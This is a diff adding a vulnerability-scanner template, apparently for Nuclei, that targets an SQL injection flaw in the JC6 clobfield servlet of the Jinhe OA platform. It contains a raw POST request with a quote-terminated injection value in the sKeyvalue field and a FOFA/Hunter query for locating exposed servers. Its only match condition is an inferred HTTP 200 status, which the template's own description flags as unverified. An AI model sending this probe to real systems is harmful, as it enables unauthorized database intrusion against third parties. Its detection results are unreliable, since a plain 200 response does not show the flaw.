@@ -1,0 +1,38 @@
+id: poc-82d067654a03bbbb7419
+info:
+  name: 金和OAJC6clobfield存在sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/82d067654a03bbbb7419cf4be7303d0a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 82d067654a03bbbb7419cf4be7303d0a
+    fofa: + hunter`web.body="JC6金和协同管理平台"`
+http:
+- raw:
+  - 'POST /jc6/servlet/clobfield HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+
+    Content-Length: 158
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Content-Type: application/x-www-form-urlencoded
+
+    SL-CE-SUID: 77
+
+
+    key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
